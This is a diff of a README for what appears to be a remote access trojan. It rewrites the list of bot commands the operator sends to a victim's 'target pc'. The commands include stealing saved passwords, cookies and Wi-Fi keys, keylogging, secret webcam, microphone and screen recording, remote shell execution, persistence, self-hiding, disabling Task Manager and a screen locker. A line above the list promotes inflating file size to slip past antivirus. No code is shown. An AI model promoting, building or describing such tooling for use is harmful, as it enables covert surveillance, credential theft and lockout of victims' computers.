@@ -98,57 +98,96 @@ Antiviruses, seeing the file size that it is large, will stupidly not check it! 
 <h4>Download here: https://github.com/WhiteeRabbit/fake_file_resizer/</h4>
 
 ## You can use:
-
-        ⚔️/start - start the program
-        ⚙️/help - help with commands
-        🔌/addstartup - to add autostart
-        🧑🏻‍💻/users - show users in pc
-        🔑/passwords - show saved passwords in pc
-        🍪/robloxcookie - show roblox cookies
-        🪪/info - to show information about pc ,also location , country, city , ip
-        🖥️/whoami - to show name of pc
-        💬👂🏻/textspech 'your text' - your text will sounded in pc
-        🎵/playsound 'file path' -(first run /upload to upload your music file in pc) your file will sound in pc for ex: /playsound C:\test.mp3
-        🔫/execute - execute shell commands (like terminel emulator in netcat)
-        🗡️/e 'your command' - also execute shell commands
-        🏹/ex 'your command' - use this if you will execute commands with long response 
-        📷/screenshot - to get screenshot
-        📹/webscreen - get screenshot from camera
-        🎙️/mic 'time in seconds' - record microphone of pc
-        ☢️/winblocker - my own winlocker
-        ☣️/winblocker2 - if winblocker doesnt work
-        📁/download 'your file' - to download files(for exm: /download C:\test.txt)
-        🗃️/upload - to upload file in target pc
-        📋/clipboard - show users clipboard
-        🎦/webcam - get webcam video
-        🎥/screenrecord - get screenrecord
-        🌐/chrome 'website url' - open website in chrome in target pc
-        🌐/edge 'website url' - open website in edge in target pc
-        🌐/firefox 'website url' - open website in firefox in target pc             
-        Ⓜ️/msg 'your message' - send message(messagebox) to target
-        💣/spam 'your message' - spam your message 10 times but if you will click al lot...
-        🛜/wifilist - show saved wifi
-        🔐/wifipass 'name of accespoint' - show password of saved wifi
-        🖱️/mousemesstart - start mouse messing
-        🐁/mousemesstop - stop mouse messing
-        🪤/mousekill - disable mouse
-        🐭/mousestop - enable mouse
-        🔊/fullvolume - make full volume
-        🔉/volumeplus - make pc volume + 10
-        🔇/volumeminus - make pc volume - 10
-        🪦/disabletaskmgr - disable task manager
-        📠/enabletaskmgr - enable task manager
-        🧱/wallpaper - change desktop's wallpaper
-        ⌨️/keypress 'your key' - in pc's keyboard will pressed this keys 
-        ⌨️/keypresstwo 'your key' 'your key' - in pc's keyboard will pressed this keys 
-        ⌨️/keypressthree 'your key' 'your key' 'your key' - in pc's keyboard will pressed this keys 
-        📃/tasklist - to show tasks
-        🧨/taskkill 'your task' - kill entered task
-        🕶️/hide - to hide your app
-        👓/unhide - unhide your app
-        💤/sleep - send windows to sleep
-        🕚/shutdown - shutdown pc
-        🔄️/restart - restart pc
+    **🛠️ System Commands**
+    - ⚙️ **/start** - Start the program
+    - ⚙️ **/help** - Help with commands
+    - 🔌 **/addstartup** - Add autostart
+    - ⌨️ **/keylogger** - Start keylogger
+    - ⛔ **/stopkeylogger** - Stop keylogger
+    - 👟 **/run [filepath]** - Run file
+    - 🧑🏻‍💻 **/users** - Show users on the PC
+    - 🖥️ **/whoami** - Show the name of the PC
+    - 📃 **/tasklist** - Show running tasks
+    - 🧨 **/taskkill [task]** - Kill the entered task
+    - 💤 **/sleep** - Put the PC to sleep
+    - 🕚 **/shutdown** - Shutdown the PC
+    - 🔄 **/restart** - Restart the PC
+    - 💥 **/altf4** - ALT + F4 (google it to find what it means)
+    - 💣 **/cmdbomb** - Opens 10 CMD windows
+    - Ⓜ️ **/msg [type] [title] [text]** - Displays a messagebox
+    */msg types(info; warning; error; question; default or 0)*
+    ** for ex: /msg error testtitle testtext **
+    
+    ## **🔒 Security & Privacy**
+    - 🔑 **/passwords** - Show saved passwords on the PC
+    - 🍪 **/robloxcookie** - Show Roblox cookies
+    - 🧱 **/wallpaper** - Change the desktop wallpaper
+    - 🪦 **/disabletaskmgr** - Disable Task Manager
+    - 📠 **/enabletaskmgr** - Enable Task Manager
+    - ☢️ **/winblocker** - My own winlocker
+    - ☣️ **/winblocker2** - If winblocker doesn't work
+    
+    ## **📱 Device Management**
+    - 📷 **/screenshot** - Take a screenshot
+    - 🎙️ **/mic [time in seconds]** - Record the PC's microphone
+    - 📹 **/webscreen** - Get a screenshot from the camera
+    - 🎦 **/webcam** - Get webcam video
+    - 🎥 **/screenrecord** - Record the screen
+    - 🚫 **/block** - Block user input (mouse and keyboard)
+    - ✅ **/unblock** - Unblock user input (mouse and keyboard)
+    - 🖱️ **/mousemesstart** - Start mouse messing
+    - 🐁 **/mousemesstop** - Stop mouse messing
+    - 🪤 **/mousekill** - Disable the mouse
+    - 🐭 **/mousestop** - Enable the mouse
+    - 🖱️ **/mousemove [x] [y]** - Enter x and y cordinates and mouse's pointer goes there
+    - 🐁 **/mouseclick** - Make click with mouse
+    - 🔊 **/fullvolume** - Set volume to full
+    - 🔉 **/volumeplus** - Increase volume by 10
+    - 🔇 **/volumeminus** - Decrease volume by 10
+    - 🔄️ **/rotate** - Rotate monitor +90 degrees (for exmpl: entering 2 times rotates it 180 degrees)
+    - 🪟 **/maximize** - Maximize active window
+    - 🪟 **/minimize** - Minimize active window
+    
+    ## **🌐 Networking**
+    - 🛜 **/wifilist** - Show saved Wi-Fi networks
+    - 🔐 **/wifipass [accesspoint]** - Show the password of a saved Wi-Fi network
+    - 🌐 **/chrome [website URL]** - Open a website in Chrome
+    - 🌐 **/edge [website URL]** - Open a website in Edge
+    - 🌐 **/firefox [website URL]** - Open a website in Firefox
+    
+    ## **🎶 Multimedia**
+    - 💬👂🏻 **/textspech [your text]** - Speak the text aloud
+    - 🎵 **/playsound [file path]** - Play a sound file (first upload the file using **/upload**)
+    - 📁 **/download [file path]** - Download a file from the PC
+    - 🗃️ **/upload** - Upload a file to the PC
+    - 📋 **/clipboard** - Show clipboard content
+    - 📇 **/changeclipboard [testcahnge]** - Change clipboard content
+    
+    ## **⚙️ Advanced Operations**
+    - 🗡️ **/e [command]** - Execute shell commands (shortcut)
+    - 🏹 **/ex [command]** - Execute shell commands with long responses
+    - 🔫 **/execute** - Execute shell commands my alternative of netcat in linux (works commands such as cd ,cd.. and etc...)
+    - *commands like cd ,cd .. and others work excellent in the /e ,  /ex and /execute commands.*
+    - 📅 **/metadata [filepath]** - Displays the file's metadata information
+    - ⌨️ **/keytype [key]** - Enter a text and that text will written with pc's keyboard
+    - ⌨️ **/keypress [key]** - Press a specific key on the keyboard
+    - ⌨️ **/keypresstwo [key1] [key2]** - Press two keys simultaneously
+    - ⌨️ **/keypressthree [key1] [key2] [key3]** - Press three keys simultaneously
+    - 🕶️ **/hide** - Hide your app
+    - 👓 **/unhide** - Unhide your app
+    
+    ## **🖥️ System Information**
+    - 🪪 **/info** - Show PC information (IP, location, country, city)
+    - 📊 **/pcinfo** - Info about PC's OS, system, CPU, Windows version, BIOS, etc...
+    - 💻 **/shortinfo** - Show's less but, mostly the necessary information about pc
+    - 🛠️ **/apps** - Show installed apps on the PC
+    - 🔋 **/batteryinfo** - Show info about battery 
+    
+    ## **EXAMPLES:**
+    - 📖 **/examples** - Shows examples
+    
+    ## **📱🤳🏻My Socials:🌐📲**
+    - 🔗 **/github** - [**My github**]
 
 
 
